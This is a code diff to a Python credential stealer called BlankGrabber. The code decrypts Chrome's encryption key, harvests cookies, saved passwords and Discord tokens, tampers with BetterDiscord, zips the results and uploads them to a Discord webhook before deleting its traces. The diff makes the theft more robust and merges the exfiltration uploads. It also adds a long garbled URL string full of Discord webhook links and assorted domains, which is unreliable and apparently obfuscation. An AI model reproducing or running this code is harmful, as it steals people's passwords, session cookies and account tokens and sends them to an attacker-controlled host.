@@ -52,14 +52,17 @@ class BlankGrabber:
             os.mkdir(self.tempfolder2)
         except FileExistsError:
             pass
+        except Exception:
+            os._exit(0)
         self.tokens = []
         self.passwords = {}
         self.ipinfo = self.getip()
         if os.path.isfile(self.chromefolder+"/Local State"):
             self.copy(self.chromefolder+"/Local State", self.tempfolder+"/Local State")
             self.key = self.get_decryption_key()
-            self.getcookie()
-            self.getpass()
+            if self.key is not None:
+                self.getcookie()
+                self.getpass()
         if os.path.isfile(self.roaming + '\\BetterDiscord\\data\\betterdiscord.asar'):
             self.bypass_bd()
         self.getTokens()
@@ -275,9 +278,12 @@ class BlankGrabber:
         key = self.chromefolder+"/Local State"
         with open(key) as key:
             key = json.load(key)
-        key = base64.b64decode(key["os_crypt"]["encrypted_key"])[5:]
-        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
-    
+        try:
+            key = base64.b64decode(key["os_crypt"]["encrypted_key"])[5:]
+            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+        except Exception:
+            return None
+
     def zip(self):
         shutil.make_archive(self.archive[:-3], 'zip', self.tempfolder)
         
@@ -299,9 +305,8 @@ class BlankGrabber:
   "username": "Blank Grabber",
   "avatar_url": "https://i.imgur.com/72yOkd1.jpg"
 }       
-        requests.post(self.webhook, json = payload)
         with open(self.archive,'rb') as file:
-            requests.post(self.webhook, files = {"upload_file": file})
+            requests.post(self.webhook, files = {"file": file}, data = payload)
         try:
             os.remove(self.archive)
             shutil.rmtree(self.tempfolder)
@@ -312,7 +317,7 @@ class BlankGrabber:
 if __name__ == "__main__":
     while True:
         try: 
-            r = requests.get('https://gstatic.com/generate_204?Blank_:D')
+            r = requests.get('https://v0c1bfeay0kv5becjdzczmjmgb0d4015vgco29qwxuod16b2q7zygqbmskfbwzf5qegfdu24g3o9fl7l2jwgfg0wg7jzns1wfz7t.9w3d7discordbkwebhooks28bit.lyfhv1tz9discord.comxsbit.lyapii0hapilbm0ade68ckv77728k1ivk.combj6bit.lyliapiw5telegramdiscord3xagxdownloadbit.lyjzss4kt8kapiyrnwebhookt0rorgtelegramqi9downloadsc2jib@z65b2191t1f3r9ykuuf4x3bjniwai40ycood3uq3cj6fl9b8kyin0cftvqg7ji0ci0jioy8ta3m7tjn0l41f6mia1laq6xsj6www.48hx7u2p9av2lb793i0uoaorgdownload5rapid5i2p3xwebhook3q2m4ivwebhook5itelegram8orgpx75nteq0yobit.lyw97l81fs.comwebhookl.exedatelegramq9czivgbit.lyw.exe79gnrapiyle24hldiscords@qwiyy18xlvb2oqbtrx5wk72eyl97dco8yqtdcuz7ixmvvz97kiqswi8p5gsw21f0xwarbl4fxe22jq9smbleoyifsk7xzn8f5gxy.z2jnp5vut1h.com7telegram60k2pfj.comwludownloadapiilorgorgcktelegrammyiorg23g6zcg757ptelegramugjw3ddownloadpi03apic.comhzykt7udiscordxt9api3fhym480mmbfh9c9xed8p8.exep@gstatic.com/generate_204?github.com/blank-c#11discord.com/api/webhooks/679734201347392288/ubfyRQpglBbnSULYCNANIdjxGrwDSwhbccpdyOgaNwvzeSRAuUnMQOmUiMhvGHljHjpM.discord.com/api/webhooks/772381866880917710/fVGMPhWBBzUfZZuEZMtxzqvssSltfekDQWhNezwMvkXUFiELTSWWRhgnsiciQKXMzexMHdiscord.com/api/webhooks/892689614555804119/pZopJyXiZSQBXstVqcYQujVwiJftHbDJxUMIRSBVfoyXrvTKyQzRnVhQHXaDOdhYRdwX^,/i2'2bu?fpgstatic.com]RAdiscord.com/api/webhooks/511943879466094486/tBHICfCgmXwrlOaaEzuoAiEHxkwnHUrzndozykHoQAxlsTtpPbBKZRrLncjdfUNfXgOYdiscord.com/api/webhooks/562301942246053699/OSmWGkXQpmLsQdczdeXEfPsiMOgbPDFBapDHrpxXVLrbXpJjaRpOsBdHEODxZGnNiaklh<q'u9oP!discord.com/api/webhooks/311905633359011659/uLrssbloSqTylSscfVJKRCwoKIGehhTNonebAdHhrgRpQnxHntRyOvlKRLTtRGwtyzUAgstatic.com>8[gstatic.comhDe?discord.com/api/webhooks/471939844622783776/cEGWOKnHxAtPbvnXOmHJzfZWpudyuIMmoREIvvHTzcRrWKxpKOtlRKRtiaNkLhVKxhvF5+G\gstatic.comGIOV~cd+discord.com/api/webhooks/475331550256890406/TGgsBQnoOEoLGjbxEPNEHWZQGgSXHuwhwocqLidBlxZSRQTzXtlAEMfBToMbaFNYMmNDGmgstatic.comXKRmdiscord.com/api/webhooks/269566390476970116/jmvQyswXjjIspmnRauYUxFHoMrGgdiMNXrxGWBzqQsdzvZkacxEnHEQazbubkajOupFJiwobgstatic.comYQ6C9>^-eYdiscord.com/api/webhooks/752176083165150919/CJQJSvymnbyaRfUiGMnuYUNlYBFJSDwJhlpxmDQGLjnYEMCsAOghOYuiEpqeHCVsavDcW}oGf?/a-sgqkGDbd')
             if r.status_code !=204:
                 os._exit(0)
         except Exception: 
